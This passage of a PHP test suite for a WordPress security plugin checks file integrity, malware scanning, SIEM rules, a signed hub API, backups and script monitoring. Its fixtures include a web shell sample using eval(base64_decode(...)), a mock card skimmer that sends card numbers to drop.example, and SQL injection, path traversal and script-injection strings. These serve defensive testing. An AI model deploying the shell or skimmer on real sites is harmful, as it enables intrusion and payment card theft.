			check( 'a changed wp-config.php shows the new line with its secret hidden', $lines && false !== strpos( $shown, 'SST_TEST_KEY' ) && false === strpos( $shown, 'sst-super-secret' ) && false !== strpos( $shown, '••••••' ) );
			check( 'wp-config.php itself is never stored', false === strpos( wp_json_encode( Network::get_option( Integrity::OPTION ) ), 'DB_PASSWORD' ) );
			check( 'wp-config.php cannot be put back from here', is_wp_error( Integrity::restore( 'wp-config.php' ) ) );
			file_put_contents( $config, $cfg );
			Integrity::check();
			check( 'the original wp-config.php matches again', ! isset( Integrity::changed()['wp-config.php'] ) );

			file_put_contents( $dropin, '<?php // sst' );
			Integrity::check();
			check( 'a new drop-in is reported', isset( Integrity::changed()['wp-content/db-error.php'] ) );
			Integrity::restore( 'wp-content/db-error.php' );
			check( 'a new drop-in can be deleted from the list', ! is_file( $dropin ) && ! Integrity::changed() );

			Firewall::uploads_rule( true );
			Integrity::check();
			$quiet = ! isset( Integrity::changed()['wp-content/uploads/.htaccess'] );
			Firewall::uploads_rule( false );
			Integrity::check();
			check( 'the no-PHP-in-uploads switch is not reported as a break-in', $quiet && ! Integrity::changed() );
		} finally {
			file_put_contents( $config, $cfg );
			if ( is_file( $dropin ) ) {
				unlink( $dropin );
			}
			if ( null === $had_ht ) {
				if ( is_file( $ht ) ) {
					unlink( $ht );
				}
			} else {
				file_put_contents( $ht, $had_ht );
			}
			$saved ? Network::update_option( Integrity::OPTION, $saved, false ) : Network::delete_option( Integrity::OPTION );
		}
	}
);

group(
	'Threat feed and country lookup',
	function () {
		$records = Threat_Feed::parse( "203.0.113.0/24\n2001:db8::/32\n" );
		check( 'the threat list parser reads IPv4 and IPv6 ranges', 2 === count( $records ) );
		if ( Geo_Db::enabled() && Geo_Db::ready() ) {
			check( 'built-in lookup finds 8.8.8.8 in the US', 'US' === Geo_Db::lookup( '8.8.8.8' ) );
			check( 'built-in lookup finds an IPv6 address', 'US' === Geo_Db::lookup( '2001:4860:4860::8888' ) );
			check( 'private addresses have no country', '' === Geo_Db::lookup( '192.168.1.10' ) );
		} else {
			echo "  skip  built-in country lookup (database not downloaded on this site)\n";
		}
		$csv = wp_tempnam( 'sst-geo' );
		$bin = wp_tempnam( 'sst-geo-bin' );
		$out = '';
		for ( $i = 0; $i < 1500; $i++ ) {
			$out .= ( $i * 256 ) . ',' . ( $i * 256 + 255 ) . ',' . ( $i < 750 ? 'AA' : 'BB' ) . "\n";
		}
		file_put_contents( $csv, $out . "garbage line\n1,2,lowercase\n" ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents -- Test fixture.
		check( 'the database builder merges neighbouring ranges and skips junk', 0 === Geo_Db::build( $csv, $bin, 4 ) );
		for ( $i = 0; $i < 1500; $i++ ) {
			$out .= ( 1000000 + $i * 512 ) . ',' . ( 1000000 + $i * 512 + 255 ) . ',CC' . "\n";
		}
		file_put_contents( $csv, $out ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents -- Test fixture.
		check( 'the database builder keeps separate ranges apart', 1502 === Geo_Db::build( $csv, $bin, 4 ) );
		wp_delete_file( $csv );
		wp_delete_file( $bin );
	}
);

group(
	'Malware scan',
	function () {
		$uploads = wp_upload_dir();
		$file    = trailingslashit( $uploads['basedir'] ) . 'sst-test-' . wp_rand() . '.php';
		// A harmless file that looks exactly like a common web shell.
		file_put_contents( $file, '<?php /* Chaos Shield test file */ if ( isset( $_POST["z"] ) ) { eval( base64_decode( $_POST["z"] ) ); }' ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents -- Test fixture.
		$GLOBALS['sst']['files'][] = $file;
		Scanner::start( 'test' );
		$guard = 0;
		while ( Scanner::running() && $guard++ < 200 ) {
			Scanner::step( 8 );
		}
		$found = false;
		foreach ( Scanner::open_findings() as $f ) {
			if ( isset( $f['file'] ) && false !== strpos( $f['file'], basename( $file ) ) ) {
				$found = true;
			}
		}
		check( 'a PHP web shell in uploads is found by the scan', $found );
	}
);

group(
	'SIEM',
	function () {
		$from = ip();
		foreach ( array( 'alice', 'bob', 'carol', 'dave', 'erin' ) as $name ) {
			login( 'sst_' . $name, 'x', $from );
		}
		$hit = Incidents::query(
			array(
				'ip'     => $from,
				'status' => 'all',
			)
		);
		check( 'credential stuffing from one IP opens an incident', $hit && 'stuffing' === $hit[0]['rule'] );
		login( 'sst_frank', 'x', $from );
		$again = Incidents::query(
			array(
				'ip'     => $from,
				'status' => 'all',
			)
		);
		check( 'more of the same merges into that incident', 1 === count( $again ) && (int) $again[0]['hits'] >= 2 );

		$q = Siem::parse( 'action:auth.* ip:203.0.113.9 sev:3 since:2h "two words" loose' );
		check( 'the search language reads fields, quotes and free words', 'auth.*' === $q['action'] && '203.0.113.9' === $q['ip'] && 3 === $q['min_severity'] && 'two words loose' === $q['search'] && abs( $q['since'] - ( time() - 7200 ) ) < 5 );
		$inject = Events::query( Siem::parse( "ip:1' OR '1'='1" ) + array( 'limit' => 5 ) );
		check( 'quotes in a search cannot change the query', is_array( $inject ) && ! $inject );
	}
);

group(
	'Hub API',
	function () {
		$status = '/?rest_route=/chaos-shield/v1/status';
		check( 'status needs a key', in_array( http( 'GET', $status, ip() )['status'], array( 401, 403 ), true ) );
		check( 'a wrong key is refused', 403 === http( 'GET', $status, ip(), array( 'headers' => array( 'X-Chaos-Key' => 'ssk_wrong' ) ) )['status'] );
		$key = Api::new_key( true );
		$res = http( 'GET', $status, ip(), array( 'headers' => array( 'X-Chaos-Key' => $key ) ) );
		$doc = json_decode( $res['body'], true );
		check( 'the right key reads the status', 200 === $res['status'] && isset( $doc['score'], $doc['incidents'] ) );

		$route = '/chaos-shield/v1/hub/release';
		$from  = ip();
		$send  = function ( $time, $nonce, $sig ) use ( $route, $from ) {
			return http(
				'POST',
				'/?rest_route=' . $route,
				$from,
				array(
					'headers' => array(
						'X-Chaos-Time'      => (string) $time,
						'X-Chaos-Nonce'     => $nonce,
						'X-Chaos-Signature' => $sig,
					),
					'body'    => '',
				)
			)['status'];
		};
		$nonce = wp_generate_password( 24, false );
		$now   = time();
		$sig   = Api::sign( $key, $now, $nonce, 'POST', $route, '' );
		check( 'a signed hub action runs', 200 === $send( $now, $nonce, $sig ) );
		check( 'the same signed request cannot be replayed', 403 === $send( $now, $nonce, $sig ) );
		$old   = $now - 900;
		$nonce = wp_generate_password( 24, false );
		check( 'an old signed request is refused', 403 === $send( $old, $nonce, Api::sign( $key, $old, $nonce, 'POST', $route, '' ) ) );
		$nonce = wp_generate_password( 24, false );
		check( 'a signature made with the wrong key is refused', 403 === $send( $now, $nonce, Api::sign( 'ssk_wrong', $now, $nonce, 'POST', $route, '' ) ) );
		Api::new_key( false );
		$nonce = wp_generate_password( 24, false );
		check( 'a read-only key cannot run actions', 403 === $send( time(), $nonce, Api::sign( $key, time(), $nonce, 'POST', $route, '' ) ) );
	}
);

group(
	'Launch hardening',
	function () {
		// Forced password reset: the right password must not hand out a reset key.
		$user = user();
		$pass = password( $user );
		update_user_meta( $user->ID, Password_Policy::FORCED_META, 1 );
		$before = get_userdata( $user->ID )->user_activation_key;
		$res    = login( $user->user_login, $pass, ip() );
		clean_user_cache( $user->ID );
		check( 'a forced reset does not log in', ! logged_in( $res ) );
		check( 'a forced reset puts no reset key in the reply', false === strpos( $res['location'] . $res['body'], 'key=' ) );
		check( 'a forced reset emails a link instead', get_userdata( $user->ID )->user_activation_key !== $before );
		delete_user_meta( $user->ID, Password_Policy::FORCED_META );
		Network::delete_transient( 'cshield_rp_sent_' . $user->ID );

		// Signed hub reads.
		$key    = Api::new_key( false );
		$route  = '/chaos-shield/v1/status';
		$nonce  = wp_generate_password( 24, false );
		$now    = time();
		$signed = http(
			'GET',
			'/?rest_route=' . $route,
			ip(),
			array(
				'headers' => array(
					'X-Chaos-Time'      => (string) $now,
					'X-Chaos-Nonce'     => $nonce,
					'X-Chaos-Signature' => Api::sign( hash( 'sha256', $key ), $now, $nonce, 'GET', $route, '' ),
				),
			)
		);
		check( 'the hub reads status with a signature instead of the key', 200 === $signed['status'] );
		check( 'the hub only adds sites over https or a private network', ! \ChaosShield\Hub::secure_url( 'http://example.com' ) && \ChaosShield\Hub::secure_url( 'https://example.com' ) && \ChaosShield\Hub::secure_url( 'http://10.0.0.4' ) );

		// Proxy headers.
		check( 'a proxy header from a public address is not believed', ! Request::trusted_proxy( '45.33.1.2', 'HTTP_X_FORWARDED_FOR', array() ) );
		check( 'a proxy header from a private network is believed', Request::trusted_proxy( '10.0.0.5', 'HTTP_X_FORWARDED_FOR', array() ) );
		check( 'the Cloudflare header is believed from Cloudflare', Request::trusted_proxy( '104.16.1.1', 'HTTP_CF_CONNECTING_IP', array() ) );
		check( 'only Cloudflare may send the Cloudflare header', ! Request::trusted_proxy( '104.16.1.1', 'HTTP_X_FORWARDED_FOR', array() ) );
		check( 'a trusted list replaces the defaults', ! Request::trusted_proxy( '10.0.0.5', 'HTTP_X_FORWARDED_FOR', array( '203.0.113.9' ) ) && Request::trusted_proxy( '203.0.113.9', 'HTTP_X_FORWARDED_FOR', array( '203.0.113.9' ) ) );

		// Country allow mode. The tests reach the site from localhost, a private
		// address, so the X-Country-Code header counts unless trusted proxies say otherwise.
		$saved = Network::get_option( Settings::OPTION );
		Network::update_option(
			Settings::OPTION,
			array_merge(
				$saved,
				array(
					'country_block'  => true,
					'country_source' => 'server',
					'country_mode'   => 'allow',
					'country_scope'  => 'site',
					'country_list'   => array( 'US' ),
				)
			)
		);
		$cc = function ( $code, $from ) {
			return http( 'GET', '/', $from, array( 'headers' => $code ? array( 'X-Country-Code' => $code ) : array() ) )['status'];
		};
		check( 'allow mode lets a listed country in', 200 === $cc( 'US', ip() ) );
		check( 'allow mode keeps other countries out', 403 === $cc( 'CN', ip() ) );
		check( 'allow mode keeps out a visitor with no country', 403 === $cc( '', ip() ) );
		check( 'allow mode still lets private network visitors in', 200 === $cc( '', '10.9.8.7' ) );
		Network::update_option( Settings::OPTION, array_merge( Network::get_option( Settings::OPTION ), array( 'trusted_proxies' => array( '203.0.113.9' ) ) ) );
		check( 'a country header from an untrusted connection is ignored', 403 === $cc( 'US', ip() ) );
		Network::update_option( Settings::OPTION, $saved );

		// User enumeration.
		check( 'REST user listing is blocked in any letter case', 401 === http( 'GET', '/?rest_route=/wp/v2/Users', ip() )['status'] );
		$post = http( 'POST', '/', ip(), array( 'body' => array( 'author' => 1 ) ) );
		check( 'author lookups sent by POST are blocked too', 301 === $post['status'] && false === strpos( $post['location'], 'author' ) );

		// Another site's page cannot get its visitors banned.
		$victim  = ip();
		$embed   = array(
			'headers' => array(
				'Sec-Fetch-Site' => 'cross-site',
				'Sec-Fetch-Dest' => 'image',
				'Sec-Fetch-Mode' => 'no-cors',
			),
		);
		$blocked = 0;
		for ( $i = 0; $i < 12; $i++ ) {
			$blocked += 403 === http( 'GET', '/?id=' . $i . '%20UNION%20SELECT%201', $victim, $embed )['status'] ? 1 : 0;
		}
		check( 'attacks embedded by another site are still blocked', 12 === $blocked );
		check( 'but they do not ban the visitor', ! Bans::until( $victim ) && 200 === http( 'GET', '/', $victim )['status'] );

		// Adding a passkey needs the current password.
		Network::update_option( Settings::OPTION, array_merge( $saved, array( 'passkeys' => true ) ) );
		$admin   = user();
		$apass   = password( $admin );
		$cookies = admin_cookies( $admin->ID );
		$me      = ip();
		$profile = http( 'GET', admin_url( 'profile.php' ), $me, array( 'cookies' => $cookies ) );
		preg_match( '#cshieldPasskey = \{[^;]*?"nonce":"([a-f0-9]+)"#', $profile['body'], $m );
		$ask   = function ( $password ) use ( $me, $cookies, $m ) {
			$body = array(
				'action' => 'cshield_pk_reg_options',
				'nonce'  => isset( $m[1] ) ? $m[1] : '',
			);
			if ( null !== $password ) {
				$body['password'] = $password;
			}
			return json_decode(
				http(
					'POST',
					admin_url( 'admin-ajax.php' ),
					$me,
					array(
						'cookies' => $cookies,
						'body'    => $body,
					)
				)['body'],
				true
			);
		};
		$none  = $ask( null );
		$wrong = $ask( 'wrong' );
		check( 'a passkey cannot be started without the password', ! empty( $m[1] ) && is_array( $none ) && false === $none['success'] );
		check( 'a passkey cannot be started with a wrong password', is_array( $wrong ) && false === $wrong['success'] );
		$ok = $ask( $apass );
		check( 'the right password starts the passkey', ! empty( $ok['success'] ) && ! empty( $ok['data']['challenge'] ), wp_json_encode( $ok ) );
		Network::update_option( Settings::OPTION, $saved );
	}
);

group(
	'Restore points and backups',
	function () {
		$admin = user();
		if ( is_multisite() ) {
			grant_super_admin( $admin->ID );
		}
		$cookies = admin_cookies( $admin->ID );
		$me      = ip();
		$page    = http( 'GET', Network::admin_url( 'admin.php?page=chaos-shield&tab=backups' ), $me, array( 'cookies' => $cookies ) );
		preg_match( '#name="_wpnonce" value="([a-f0-9]+)"#', $page['body'], $m );
		$nonce = isset( $m[1] ) ? $m[1] : '';
		check( 'the Backups tab loads', 200 === $page['status'] && '' !== $nonce );
		$post = function ( array $body ) use ( $me, $cookies, $nonce ) {
			return http(
				'POST',
				admin_url( 'admin-post.php' ),
				$me,
				array(
					'cookies' => $cookies,
					'body'    => $body + array(
						'action'   => Restore_Points::ACTION,
						'_wpnonce' => $nonce,
					),
				)
			);
		};

		$before = array_keys( Restore_Points::all() );
		$post( array( 'op' => 'create' ) );
		$new = array_values( array_diff( array_keys( Restore_Points::all() ), $before ) );
		check( 'an admin can take a restore point by hand', 1 === count( $new ) );
		$manifest = $new ? Restore_Points::manifest( $new[0] ) : null;
		$held     = $manifest ? wp_list_pluck( $manifest['items'], 'path' ) : array();
		check( 'it holds wp-config.php', in_array( '@root/wp-config.php', $held, true ) || in_array( '@config', $held, true ) );
		check( 'and the settings', $manifest && is_array( $manifest['settings'] ) );
		$blob = content_url( Restore_Points::DIR . '/' . $new[0] . '/1.php' );
		$res  = http( 'GET', $blob, ip() );
		check( 'a stored copy shows nothing when fetched from the web', false === strpos( $res['body'], 'DB_PASSWORD' ) && strlen( $res['body'] ) < 200 );

		// A plugin update is saved first and can be rolled back.
		$dir = WP_PLUGIN_DIR . '/sst-fixture';
		wp_mkdir_p( $dir . '/inc' );
		file_put_contents( $dir . '/sst-fixture.php', "<?php\n/*\nPlugin Name: SST fixture\nVersion: 1.0\n*/\n" );
		file_put_contents( $dir . '/inc/a.php', "<?php // version one\n" );
		( new Restore_Points() )->before_update( true, array( 'plugin' => 'sst-fixture/sst-fixture.php' ) );
		$points = Restore_Points::all();
		$point  = key( $points );
		check( 'an update takes a restore point of the plugin folder', 'update' === $points[ $point ]['reason'] && 2 === (int) $points[ $point ]['files'] && false !== strpos( $points[ $point ]['label'], 'SST fixture 1.0' ) );
		file_put_contents( $dir . '/inc/a.php', "<?php // version two\n" );
		file_put_contents( $dir . '/inc/added.php', "<?php // new in two\n" );
		$post(
			array(
				'op'    => 'restore',
				'point' => $point,
			)
		);
		clearstatcache();
		check( 'restoring puts the old files back', "<?php // version one\n" === file_get_contents( $dir . '/inc/a.php' ) );
		check( 'and removes files the update added', ! file_exists( $dir . '/inc/added.php' ) );
		$latest = Restore_Points::all();
		check( 'the state before the restore is kept as a new point', 'restore' === current( $latest )['reason'] );

		// Restoring the oldest point while the list is full still works.
		$tmp = WP_CONTENT_DIR . '/sst-oldest.txt';
		file_put_contents( $tmp, 'oldest' );
		$oldest = Restore_Points::create( 'manual', 'oldest', array( $tmp ), array(), false );
		for ( $i = count( Restore_Points::all() ); $i < Restore_Points::MAX_POINTS; $i++ ) {
			Restore_Points::create( 'manual', 'filler', array(), array(), false );
		}
		file_put_contents( $tmp, 'newer' );
		$back = Restore_Points::restore( $oldest );
		clearstatcache();
		check( 'the oldest point can be restored when the list is full', true === $back && 'oldest' === file_get_contents( $tmp ), is_wp_error( $back ) ? $back->get_error_message() : '' );
		unlink( $tmp );

		// A tampered manifest cannot write outside the site or into the restore folder.
		check( 'restore paths cannot leave the site', '' === Restore_Points::path( '@content/../../etc/passwd' ) && '' === Restore_Points::path( '@content/' . Restore_Points::DIR . '/x.php' ) && '' === Restore_Points::path( '/etc/passwd' ) );

		// Settings changes are saved first.
		$was = Network::get_option( Settings::OPTION );
		foreach ( Restore_Points::all() as $id => $p ) {
			Restore_Points::delete( $id );
		}
		Settings::forget();
		Settings::save_siem( array( 'stuffing' ), 3 );
		check( 'the test changed a setting', array( 'stuffing' ) === (array) Settings::get( 'siem_rules_off' ) );
		$points = Restore_Points::all();
		check( 'a settings change takes a restore point first', $points && 'settings' === current( $points )['reason'] );
		$post(
			array(
				'op'    => 'restore',
				'point' => key( $points ),
			)
		);
		Settings::forget();
		check( 'restoring it brings the old settings back', array() === (array) Settings::get( 'siem_rules_off' ) );
		Network::update_option( Settings::OPTION, $was );
		Settings::forget();

		// Imports cannot lock the importer out or move the login page.
		$clean = Backup::clean(
			array(
				'firewall'     => 0,
				'ip_blocklist' => array( $me, '198.51.100.7' ),
				'login_slug'   => 'elsewhere',
				'made_up_key'  => 'x',
			)
		);
		check( 'an import is cast to the right types', false === $clean['firewall'] && ! isset( $clean['made_up_key'] ) );
		check( 'an import keeps this site\'s login address', Settings::get( 'login_slug' ) === $clean['login_slug'] );
		Request::reset();
		$_SERVER['REMOTE_ADDR'] = $me;
		$clean                  = Backup::clean( array( 'ip_blocklist' => array( $me, '198.51.100.7' ) ) );
		unset( $_SERVER['REMOTE_ADDR'] );
		Request::reset();
		check( 'an import never blocks the importer\'s own IP', array( '198.51.100.7' ) === $clean['ip_blocklist'] );
		$clean = Backup::clean(
			array(
				'login_max_attempts' => 100000,
				'rate_pages'         => 0,
				'ip_allowlist'       => array( '0.0.0.0/0', 'not-an-ip' ),
				'forward_webhook'    => 'file:///etc/passwd',
				'forward_syslog'     => 'gopher://x',
				'csp_mode'           => 'evil',
				'fw_mode'            => 'learn',
				'fw_learn_until'     => time() + 365 * DAY_IN_SECONDS,
				'fw_rules_off'       => array( 'sqli', 'made-up' ),
				'help_color'         => 'red;}</style><script>',
			)
		);
		check( 'an import gets the same checks as the settings forms', 50 === $clean['login_max_attempts'] && 30 === $clean['rate_pages'] && array( '0.0.0.0/0' ) === $clean['ip_allowlist'] && '' === $clean['forward_webhook'] && '' === $clean['forward_syslog'] && 'off' === $clean['csp_mode'] && $clean['fw_learn_until'] <= time() + 7 * DAY_IN_SECONDS && array( 'sqli' ) === $clean['fw_rules_off'] && '#2563eb' === $clean['help_color'] );

		$db  = http(
			'POST',
			admin_url( 'admin-post.php' ),
			$me,
			array(
				'cookies' => $cookies,
				'body'    => array(
					'action'   => Restore_Points::ACTION,
					'_wpnonce' => $nonce,
					'op'       => 'database',
				),
			)
		);
		$sql = function_exists( 'gzdecode' ) ? (string) @gzdecode( $db['body'] ) : $db['body'];
		check( 'the database backup downloads as SQL', 200 === $db['status'] && false !== strpos( $sql, 'CREATE TABLE' ) && false !== strpos( $sql, 'INSERT INTO' ) );

		$editor = user( 'editor' );
		$denied = http(
			'POST',
			admin_url( 'admin-post.php' ),
			ip(),
			array(
				'cookies' => admin_cookies( $editor->ID ),
				'body'    => array(
					'action'   => Restore_Points::ACTION,
					'_wpnonce' => $nonce,
					'op'       => 'database',
				),
			)
		);
		check( 'editors cannot download the database', 403 === $denied['status'] );

		foreach ( Restore_Points::all() as $id => $p ) {
			Restore_Points::delete( $id );
		}
		$it = new \RecursiveIteratorIterator( new \RecursiveDirectoryIterator( $dir, \FilesystemIterator::SKIP_DOTS ), \RecursiveIteratorIterator::CHILD_FIRST );
		foreach ( $it as $f ) {
			$f->isDir() ? rmdir( $f->getPathname() ) : unlink( $f->getPathname() );
		}
		rmdir( $dir );
	}
);

group(
	'Visitor help',
	function () {
		Settings::forget();
		$saved_req = Network::get_option( Help::REQUESTS );
		$saved_faq = Network::get_option( Help::FAQ );
		$browser   = array( 'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' );
		$set       = static function ( array $values ) {
			Network::update_option( Settings::OPTION, array_merge( Settings::all(), $values ) );
			Settings::forget();
		};
		try {
			$set(
				array(
					'visitor_help' => true,
					'help_contact' => true,
					'help_bubble'  => false,
				)
			);
			Network::delete_option( Help::REQUESTS );
			$attack = '/?id=1%20UNION%20SELECT%20user_pass%20FROM%20wp_users';
			$page   = http( 'GET', $attack, ip(), array( 'headers' => $browser ) );
			check( 'a blocked browser gets a help page with a 403', 403 === $page['status'] && false !== strpos( $page['body'], 'id="ssh-assistant"' ) && false !== strpos( $page['body'], 'window.cshieldHelp' ) );
			check( 'the help page shows the block reference', (bool) preg_match( '/<code>[A-Z0-9]{6,12}<\/code>/', $page['body'] ) );
			check( 'the help page never names the rule that fired', false === stripos( $page['body'], 'union' ) && false === stripos( $page['body'], 'sql' ) && false === stripos( $page['body'], 'user_pass' ) );
			$plain = http( 'GET', $attack, ip() );
			check( 'scripts and tools still get the one-line text answer', 403 === $plain['status'] && 0 === strpos( $plain['body'], '403 Forbidden' ) && false === strpos( $plain['body'], '<html' ) );
			$json = http( 'GET', '/wp-json/?id=1%20UNION%20SELECT%201', ip(), array( 'headers' => $browser ) );
			check( 'REST requests get the text answer', 403 === $json['status'] && false === strpos( $json['body'], '<html' ) );

			$banned = ip();
			Bans::ban( $banned, 'test' );
			$ban_page = http( 'GET', '/', $banned, array( 'headers' => $browser ) );
			check( 'a banned visitor gets the help page too', 403 === $ban_page['status'] && false !== strpos( $ban_page['body'], 'ssh-assistant' ) );
			$form = array(
				'cshield_help' => 'ask',
				'token'        => Help::token( time() - 30 ),
				'name'         => 'Sam <b>Tester</b>',
				'email'        => 'sam@example.com',
				'message'      => 'I was blocked while reading the blog. <script>alert(1)</script>',
				'reference'    => 'abc123',
				'reason'       => 'ban',
				'website'      => '',
			);
			$sent = http( 'POST', '/', $banned, array( 'body' => $form ) );
			$res  = json_decode( $sent['body'], true );
			$req  = Help::requests();
			check( 'a banned visitor can still send the owner a message', 200 === $sent['status'] && ! empty( $res['ok'] ) && 1 === count( $req ) && $banned === $req[0]['ip'], substr( $sent['body'], 0, 120 ) );
			check( 'the stored message is cleaned', $req && false === strpos( $req[0]['message'], '<script' ) && false === strpos( $req[0]['name'], '<b>' ) && 'ABC123' === $req[0]['ref'] && 'ban' === $req[0]['reason'] );
			check( 'the owner is notified from a scheduled job', (bool) Network::next_scheduled( Help::NOTIFY, array( $req ? $req[0]['id'] : '' ) ) );
			Network::clear_scheduled( Help::NOTIFY );
			check( 'clearing the job also removes alerts waiting for one message', ! Network::next_scheduled( Help::NOTIFY, array( $req ? $req[0]['id'] : '' ) ) );
			$bot = http( 'POST', '/', ip(), array( 'body' => array_merge( $form, array( 'website' => 'http://spam.example' ) ) ) );
			check( 'a filled-in hidden field is refused', empty( json_decode( $bot['body'], true )['ok'] ) && 1 === count( Help::requests() ) );
			$fast = http( 'POST', '/', ip(), array( 'body' => array_merge( $form, array( 'token' => Help::token() ) ) ) );
			$fake = http( 'POST', '/', ip(), array( 'body' => array_merge( $form, array( 'token' => ( time() - 30 ) . '.' . str_repeat( 'a', 32 ) ) ) ) );
			check( 'forms sent instantly or with a forged token are refused', empty( json_decode( $fast['body'], true )['ok'] ) && empty( json_decode( $fake['body'], true )['ok'] ) && 1 === count( Help::requests() ) );
			$spam = ip();
			for ( $i = 0; $i < 4; $i++ ) {
				$last = http( 'POST', '/', $spam, array( 'body' => $form ) );
			}
			check( 'each IP can send three messages an hour', empty( json_decode( $last['body'], true )['ok'] ) && 4 === count( Help::requests() ) );
			$net = '45.35.' . wp_rand( 1, 254 ) . '.';
			for ( $i = 0; $i < 7; $i++ ) {
				http( 'POST', '/', $net . ( $i + 1 ), array( 'body' => $form ) );
			}
			$from_net = array_filter(
				Help::requests(),
				static function ( $r ) use ( $net ) {
					return 0 === strpos( $r['ip'], $net );
				}
			);
			check( 'one network cannot fill the inbox from many addresses', 5 === count( $from_net ), (string) count( $from_net ) );
			foreach ( $from_net as $r ) {
				Help::dismiss( $r['id'] );
			}

			$id = '';
			foreach ( Help::requests() as $r ) {
				if ( $banned === $r['ip'] ) {
					$id = $r['id'];
				}
			}
			Help::allow( $id );
			check( 'Allow lifts the ban', Bans::until( $banned ) <= time() && 200 === http( 'GET', '/', $banned )['status'] );
			$after = wp_list_pluck( Help::requests(), 'status', 'id' );
			check( 'the message is marked allowed', isset( $after[ $id ] ) && 'allowed' === $after[ $id ] );
			Help::dismiss( '' );
			check( 'handled messages can be removed', ! in_array( $id, wp_list_pluck( Help::requests(), 'id' ), true ) && 3 === count( Help::requests() ) );

			$login = http( 'GET', '/wp-login.php', ip(), array( 'headers' => $browser ) );
			check( 'the login page has the sign-in help bubble', false !== strpos( $login['body'], 'ssh-bubble-root' ) );
			$home = http( 'GET', '/', ip(), array( 'headers' => $browser ) );
			check( 'the site bubble is off until switched on', false === strpos( $home['body'], 'ssh-bubble-root' ) );
			Help::save_faq(
				array(
					array(
						'q' => 'Do you ship abroad?',
						'k' => 'shipping, international',
						'a' => 'Yes, to 30 countries. <script>x</script>',
					),
					array(
						'q' => '',
						'a' => 'no question',
					),
				)
			);
			$faq = Help::faq();
			check( 'the owner FAQ is saved and cleaned', 1 === count( $faq ) && 'Do you ship abroad?' === $faq[0]['q'] && false === strpos( $faq[0]['a'], '<script' ) );
			$set( array( 'help_bubble' => true ) );
			$home = http( 'GET', '/', ip(), array( 'headers' => $browser ) );
			check( 'switched on, every page has the bubble with the owner FAQ', false !== strpos( $home['body'], 'ssh-bubble-root' ) && false !== strpos( $home['body'], 'Do you ship abroad?' ) );

			$set( array( 'visitor_help' => false ) );
			$off = http( 'GET', $attack, ip(), array( 'headers' => $browser ) );
			check( 'with visitor help off, block pages are plain text again', 403 === $off['status'] && 0 === strpos( $off['body'], '403 Forbidden' ) );
			$closed = http( 'POST', '/', ip(), array( 'body' => $form ) );
			check( 'with visitor help off, messages are refused', empty( json_decode( $closed['body'], true )['ok'] ) );
		} finally {
			$set(
				array(
					'visitor_help' => true,
					'help_bubble'  => false,
				)
			);
			null === $saved_req || false === $saved_req ? Network::delete_option( Help::REQUESTS ) : Network::update_option( Help::REQUESTS, $saved_req, false );
			null === $saved_faq || false === $saved_faq ? Network::delete_option( Help::FAQ ) : Network::update_option( Help::FAQ, $saved_faq, false );
		}
	}
);

group(
	'Edge protection',
	function () {
		Settings::forget();
		$browser = array( 'Accept' => 'text/html,application/xhtml+xml,*/*;q=0.8' );
		$set     = static function ( array $values ) {
			Network::update_option( Settings::OPTION, array_merge( Settings::all(), $values ) );
			Settings::forget();
		};
		$log     = static function () {
			wp_cache_flush();
			return (array) get_site_option( 'sst_http_log', array() );
		};
		$saved   = array();
		foreach ( array( Scripts::OPTION, Exposure::OPTION, Https::OPTION, Page_Check::OPTION, Attack_Mode::OPTION, Cloudflare::TOKEN, Cloudflare::ZONE, Cloudflare::RULES, Cloudflare::STATUS ) as $option ) {
			$saved[ $option ] = Network::get_option( $option );
			Network::delete_option( $option );
		}
		$planted = array( ABSPATH . '.env', ABSPATH . 'backup.sql' );
		$uploads = wp_upload_dir( null, false );
		$local   = $uploads['basedir'] . '/old-site-backup.zip';
		try {
			// Scripts.
			Page_Check::run();
			$items = Scripts::state()['items'];
			check(
				'the first look lists the page scripts as approved',
				$items && ! array_filter(
					wp_list_pluck( $items, 'status' ),
					static function ( $st ) {
						return 'approved' !== $st;
					}
				)
			); // phpcs:ignore Generic.Formatting.MultipleStatementAlignment, Squiz.Functions.MultiLineFunctionDeclaration -- Short test callback.
			update_site_option( 'sst_inject', '<script src="https://evil-cdn.example/skim.js?v=3"></script><script>var cfg={key:"AKIAABCDEFGHIJKLMNOP"};</script><script type="application/ld+json">{"a":1}</script>' );
			update_site_option(
				'sst_http_mock',
				array(
					'evil-cdn.example' => array(
						'code' => 200,
						'body' => 'document.querySelector("#cc_number").addEventListener("blur",function(e){fetch("https://drop.example/c?d="+btoa(e.target.value))});',
					),
				)
			);
			Page_Check::run();
			$items = Scripts::state()['items'];
			$evil  = isset( $items['evil-cdn.example/skim.js'] ) ? $items['evil-cdn.example/skim.js'] : array();
			check( 'a new outside script is listed as new', $evil && 'new' === $evil['status'] && 'external' === $evil['kind'] && in_array( '/', $evil['pages'], true ) );
			check( 'a card skimmer is flagged', $evil && false !== stripos( $evil['flag'], 'card' ) );
			check(
				'JSON blocks are not taken for scripts',
				1 === count(
					array_filter(
						array_keys( $items ),
						static function ( $k ) {
							return 0 === strpos( $k, 'inline:' );
						}
					)
				) || ! array_filter(
					array_keys( $items ),
					static function ( $k ) {
						return 0 === strpos( $k, 'inline:' );
					}
				)
			); // phpcs:ignore Squiz.Functions.MultiLineFunctionDeclaration -- Short test callback.
			$keys = Exposure::state()['keys'];
			check( 'a secret key in a page is found and shown masked', $keys && 'AWS access key' === $keys[0]['type'] && false === strpos( $keys[0]['masked'], 'AKIAABCDEFGHIJKLMNOP' ) );
			check( 'the security score reports both', in_array( 'page_scripts', wp_list_pluck( \ChaosShield\Posture::checks(), 'id' ), true ) && in_array( 'exposure', wp_list_pluck( \ChaosShield\Posture::checks(), 'id' ), true ) );

			// Content Security Policy.
			$set( array( 'csp_mode' => 'report' ) );
			$page = http( 'GET', '/', ip(), array( 'headers' => $browser ) );
			$csp  = (string) wp_remote_retrieve_header( array( 'headers' => $page['headers'] ), 'content-security-policy-report-only' );
			check( 'report mode sends a report-only policy', false !== strpos( $csp, "script-src 'self' 'unsafe-inline'" ) && false !== strpos( $csp, 'report-uri' ) && false === strpos( $csp, 'evil-cdn.example' ) );
			Scripts::mark( 'approve', array( 'evil-cdn.example/skim.js' ) );
			$set( array( 'csp_mode' => 'enforce' ) );
			$page = http( 'GET', '/', ip(), array( 'headers' => $browser ) );
			$csp  = (string) wp_remote_retrieve_header( array( 'headers' => $page['headers'] ), 'content-security-policy' );
